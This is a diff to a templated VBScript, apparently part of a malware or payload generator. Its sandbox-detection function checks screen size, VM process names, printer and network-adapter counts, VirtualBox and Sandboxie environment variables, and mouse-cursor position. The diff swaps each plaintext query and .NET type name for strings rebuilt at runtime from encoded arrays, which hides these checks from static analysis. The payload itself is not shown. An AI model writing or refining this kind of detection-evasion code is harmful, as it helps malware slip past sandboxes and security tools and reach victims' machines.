@@ -43,7 +43,7 @@ Function {{ v.fn_sandbox }}()
     On Error Resume Next
     If Screen.Width < 800 Or Screen.Height < 600 Then {{ v.fn_sandbox }} = True: Exit Function
     Dim wmi: Set wmi = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
-    Dim procs: Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
+    Dim procs: Set procs = wmi.ExecQuery({{ v.fn_build_str }}(Array({{ v.jsc_wmi_proc_q }})))
     Dim badList: badList = Split({{ v.fn_build_str }}(Array({{ v.jsc_vm_procs }})), "|")
     Dim p, j
     For Each p In procs
@@ -74,7 +74,7 @@ Function {{ v.fn_sandbox }}()
     Dim wmiPrt, printers, prtCount
     Set wmiPrt = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
     If Err.Number = 0 Then
-        Set printers = wmiPrt.ExecQuery("SELECT Name FROM Win32_Printer")
+        Set printers = wmiPrt.ExecQuery({{ v.fn_build_str }}(Array({{ v.jsc_wmi_printer_q }})))
         prtCount = 0
         Dim oPrt
         For Each oPrt In printers: prtCount = prtCount + 1: Next
@@ -86,7 +86,7 @@ Function {{ v.fn_sandbox }}()
     Dim wmiNa, naQ, naCnt
     Set wmiNa = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
     If Err.Number = 0 Then
-        Set naQ = wmiNa.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL")
+        Set naQ = wmiNa.ExecQuery({{ v.fn_build_str }}(Array({{ v.jsc_wmi_mac_q }})))
         naCnt = 0
         Dim oNa
         For Each oNa In naQ: naCnt = naCnt + 1: Next
@@ -96,8 +96,8 @@ Function {{ v.fn_sandbox }}()
     Set wmiNa = Nothing
     On Error Resume Next
     Dim _venv: Set _venv = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_wscript_shell }}))).Environment("Process")
-    If _venv("VBOX_VERSION") <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
-    If _venv("SANDBOXIE_HOME") <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
+    If _venv({{ v.fn_build_str }}(Array({{ v.jsc_env_vbox }}))) <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
+    If _venv({{ v.fn_build_str }}(Array({{ v.jsc_env_sandboxie }}))) <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
     Set _venv = Nothing
     On Error GoTo 0
 End Function
@@ -110,11 +110,11 @@ Sub {{ v.sub_run }}()
     On Error Resume Next
     Dim _ca: Set _ca = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
     If Err.Number = 0 Then
-        Dim _wf: Set _wf = _ca.LoadWithPartialName("System.Windows.Forms")
+        Dim _wf: Set _wf = _ca.LoadWithPartialName({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms }})))
         If Err.Number = 0 And Not IsNull(_wf) And Not IsEmpty(_wf) Then
-            Dim _ct: Set _ct = _wf.GetType("System.Windows.Forms.Cursor")
+            Dim _ct: Set _ct = _wf.GetType({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms_cur }})))
             If Err.Number = 0 And Not IsNull(_ct) Then
-                Dim _pp: Set _pp = _ct.GetProperty("Position", 24)
+                Dim _pp: Set _pp = _ct.GetProperty({{ v.fn_build_str }}(Array({{ v.jsc_cursor_position }})), 24)
                 If Err.Number = 0 And Not IsNull(_pp) Then
                     Dim _ps: Set _ps = _pp.GetValue(Nothing, Nothing)
                     If Err.Number = 0 And Not IsNull(_ps) Then
@@ -136,11 +136,11 @@ Sub {{ v.sub_run }}()
         On Error Resume Next
         Dim _ca2: Set _ca2 = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
         If Err.Number = 0 Then
-            Dim _wf2: Set _wf2 = _ca2.LoadWithPartialName("System.Windows.Forms")
+            Dim _wf2: Set _wf2 = _ca2.LoadWithPartialName({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms }})))
             If Err.Number = 0 And Not IsNull(_wf2) And Not IsEmpty(_wf2) Then
-                Dim _ct2: Set _ct2 = _wf2.GetType("System.Windows.Forms.Cursor")
+                Dim _ct2: Set _ct2 = _wf2.GetType({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms_cur }})))
                 If Err.Number = 0 And Not IsNull(_ct2) Then
-                    Dim _pp2: Set _pp2 = _ct2.GetProperty("Position", 24)
+                    Dim _pp2: Set _pp2 = _ct2.GetProperty({{ v.fn_build_str }}(Array({{ v.jsc_cursor_position }})), 24)
                     If Err.Number = 0 And Not IsNull(_pp2) Then
                         Dim _ps2: Set _ps2 = _pp2.GetValue(Nothing, Nothing)
                         If Err.Number = 0 And Not IsNull(_ps2) Then
